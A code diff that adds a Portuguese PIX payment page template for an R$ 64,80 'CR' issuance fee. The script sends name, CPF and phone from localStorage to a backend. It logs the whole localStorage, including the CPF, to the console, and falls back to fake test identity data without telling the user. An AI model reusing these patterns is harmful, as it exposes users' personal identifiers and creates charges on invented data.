@@ -1,0 +1,283 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<style>
+body {
+    background-color: #fff !important;
+}
+</style>
+<main class="container mx-auto px-4 py-8" style="background-color: #fff; min-height: 100vh;">
+    <div class="max-w-lg mx-auto bg-white p-8 rounded-lg shadow-lg border border-gray-200">
+        <!-- Cabeçalho -->
+        <div class="text-center mb-6">
+            <h2 class="text-2xl font-bold text-green-800 mb-2">PAGAMENTO PIX</h2>
+            <p class="text-gray-600">Taxa de Emissão do CR</p>
+            <p class="text-3xl font-bold text-green-600 mt-2">R$ 64,80</p>
+        </div>
+
+        <!-- Status -->
+        <div id="payment-status" class="mb-6">
+            <div id="loading-payment" class="text-center">
+                <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-green-600 mb-2"></div>
+                <p class="text-gray-600">Processando pagamento...</p>
+            </div>
+        </div>
+
+        <!-- QR Code PIX -->
+        <div id="payment-details" class="hidden">
+            <div class="text-center mb-6">
+                <div id="qr-code-container" class="mb-4 p-6 bg-gray-50 rounded-lg flex justify-center items-center">
+                    <img id="qr-code" src="" alt="QR Code PIX" class="border-2 border-gray-300 rounded bg-white p-2" style="width: 260px; height: 260px;">
+                </div>
+                <p id="qr-status" class="text-sm text-gray-600 mb-4">Gerando QR Code...</p>
+            </div>
+
+            <!-- Código PIX -->
+            <div style="margin-bottom: 24px;">
+                <label style="display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px;">Código PIX (Copia e Cola):</label>
+                <textarea id="pix-code" readonly rows="4"
+                       style="width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; background-color: #f9fafb; resize: none; font-family: monospace;" 
+                       placeholder="Código será gerado..."></textarea>
+                <div style="text-align: center; margin-top: 12px;">
+                    <button onclick="copyPixCode()" 
+                            style="background-color: #059669; color: white; padding: 18px 36px; border-radius: 2px; border: none; cursor: pointer; font-weight: 500; font-size: 18px; transition: all 0.3s;"
+                            onmouseover="this.style.backgroundColor='#047857'" 
+                            onmouseout="this.style.backgroundColor='#059669'">
+                        <i class="fas fa-copy" style="margin-right: 8px;"></i>
+                        Copiar Código PIX
+                    </button>
+                </div>
+            </div>
+
+            <!-- Instruções -->
+            <div style="background-color: #eff6ff; border-left: 4px solid #60a5fa; padding: 16px; margin-bottom: 16px; border-radius: 4px;">
+                <div style="display: flex; align-items: flex-start;">
+                    <div style="flex-shrink: 0; margin-right: 12px; margin-top: 2px;">
+                        <i class="fas fa-info-circle" style="color: #60a5fa; font-size: 16px;"></i>
+                    </div>
+                    <div>
+                        <p style="font-size: 14px; color: #1d4ed8; margin: 0;">
+                            <strong>Como pagar:</strong><br>
+                            1. Abra seu banco ou carteira digital<br>
+                            2. Escaneie o QR Code ou cole o código PIX<br>
+                            3. Confirme o pagamento de R$ 64,80
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status do Pagamento -->
+            <div id="payment-check" class="text-center">
+                <button onclick="checkPaymentStatus()" 
+                        class="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded">
+                    <i class="fas fa-sync-alt mr-2"></i>
+                    Verificar Pagamento
+                </button>
+            </div>
+        </div>
+
+        <!-- Erro -->
+        <div id="payment-error" class="hidden">
+            <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-4">
+                <div class="flex">
+                    <div class="flex-shrink-0">
+                        <i class="fas fa-exclamation-triangle text-red-400"></i>
+                    </div>
+                    <div class="ml-3">
+                        <p class="text-sm text-red-700" id="error-message">Erro ao processar pagamento</p>
+                    </div>
+                </div>
+            </div>
+            <div class="text-center">
+                <button onclick="retryPayment()" 
+                        class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">
+                    Tentar Novamente
+                </button>
+            </div>
+        </div>
+    </div>
+</main>
+
+<script>
+let currentTransactionId = null;
+
+// Função para processar pagamento ao carregar a página
+document.addEventListener('DOMContentLoaded', function() {
+    initializePayment();
+});
+
+function initializePayment() {
+    // Recuperar dados do localStorage com diferentes chaves possíveis
+    const userData = {
+        nome: localStorage.getItem('nome') || localStorage.getItem('full_name') || localStorage.getItem('fullName') || '',
+        cpf: localStorage.getItem('cpf') || localStorage.getItem('document') || '',
+        telefone: localStorage.getItem('telefone') || localStorage.getItem('phone') || localStorage.getItem('telephone') || ''
+    };
+
+    console.log('Dados do usuário:', userData);
+    console.log('LocalStorage completo:', localStorage);
+
+    // Verificar se temos pelo menos o nome (requisito mínimo)
+    if (!userData.nome) {
+        // Tentar recuperar dados de outras formas
+        const allKeys = Object.keys(localStorage);
+        console.log('Chaves disponíveis no localStorage:', allKeys);
+        
+        // Se não tem dados suficientes, usar dados de teste
+        userData.nome = 'Usuário Teste';
+        userData.cpf = '123.456.789-00';
+        userData.telefone = '11999999999';
+        
+        console.log('Usando dados de teste:', userData);
+    }
+
+    // Processar pagamento
+    fetch('/process_payment', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(userData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Resposta do pagamento:', data);
+        
+        if (data.success) {
+            showPaymentDetails(data.payment_data);
+        } else {
+            showError(data.error || 'Erro ao processar pagamento');
+        }
+    })
+    .catch(error => {
+        console.error('Erro:', error);
+        showError('Erro de conexão. Tente novamente.');
+    });
+}
+
+function showPaymentDetails(paymentData) {
+    document.getElementById('loading-payment').style.display = 'none';
+    document.getElementById('payment-details').classList.remove('hidden');
+    
+    console.log('PaymentData recebido:', paymentData);
+    
+    // Configurar QR Code
+    const qrCodeElement = document.getElementById('qr-code');
+    const qrStatusElement = document.getElementById('qr-status');
+    
+    if (paymentData.qr_code && paymentData.qr_code.trim() !== '') {
+        qrCodeElement.src = 'data:image/png;base64,' + paymentData.qr_code;
+        qrStatusElement.textContent = 'Escaneie o QR Code com seu banco';
+        qrCodeElement.style.display = 'block';
+    } else {
+        // Gerar QR Code usando o código PIX se não tiver imagem
+        if (paymentData.pix_code) {
+            generateQRCode(paymentData.pix_code);
+        } else {
+            qrStatusElement.textContent = 'QR Code não disponível';
+            qrCodeElement.style.display = 'none';
+        }
+    }
+    
+    // Configurar código PIX
+    if (paymentData.pix_code) {
+        document.getElementById('pix-code').value = paymentData.pix_code;
+        document.getElementById('pix-code').style.height = 'auto';
+    }
+    
+    // Armazenar ID da transação
+    currentTransactionId = paymentData.transaction_id;
+}
+
+function generateQRCode(pixCode) {
+    // Usar uma API de QR Code gratuita
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(pixCode)}`;
+    const qrCodeElement = document.getElementById('qr-code');
+    const qrStatusElement = document.getElementById('qr-status');
+    
+    qrCodeElement.src = qrUrl;
+    qrCodeElement.style.display = 'block';
+    qrStatusElement.textContent = 'Escaneie o QR Code com seu banco';
+}
+
+function showError(message) {
+    document.getElementById('loading-payment').style.display = 'none';
+    document.getElementById('payment-error').classList.remove('hidden');
+    document.getElementById('error-message').textContent = message;
+}
+
+function copyPixCode() {
+    const pixCodeTextarea = document.getElementById('pix-code');
+    pixCodeTextarea.select();
+    pixCodeTextarea.setSelectionRange(0, 99999); // Para dispositivos móveis
+    
+    try {
+        document.execCommand('copy');
+        // Feedback visual
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
+        button.classList.add('bg-green-800');
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.classList.remove('bg-green-800');
+        }, 2000);
+    } catch (err) {
+        console.error('Erro ao copiar código PIX:', err);
+        // Fallback para navegadores modernos
+        navigator.clipboard.writeText(pixCodeTextarea.value).then(() => {
+            const button = event.target.closest('button');
+            const originalText = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-check mr-2"></i>Copiado!';
+            button.classList.add('bg-green-800');
+            
+            setTimeout(() => {
+                button.innerHTML = originalText;
+                button.classList.remove('bg-green-800');
+            }, 2000);
+        });
+    }
+}
+
+function checkPaymentStatus() {
+    if (!currentTransactionId) {
+        alert('ID da transação não encontrado');
+        return;
+    }
+    
+    const button = event.target;
+    const originalText = button.innerHTML;
+    button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verificando...';
+    button.disabled = true;
+    
+    fetch(`/check_payment_status/${currentTransactionId}`)
+    .then(response => response.json())
+    .then(data => {
+        console.log('Status do pagamento:', data);
+        
+        if (data.success && data.status === 'PAID') {
+            // Pagamento aprovado, redirecionar
+            window.location.href = '/aprovado';
+        } else {
+            alert('Pagamento ainda pendente. Verifique novamente em alguns instantes.');
+        }
+    })
+    .catch(error => {
+        console.error('Erro ao verificar status:', error);
+        alert('Erro ao verificar status do pagamento');
+    })
+    .finally(() => {
+        button.innerHTML = originalText;
+        button.disabled = false;
+    });
+}
+
+function retryPayment() {
+    document.getElementById('payment-error').classList.add('hidden');
+    document.getElementById('loading-payment').style.display = 'block';
+    initializePayment();
+}
+</script>
+
+{% endblock %}
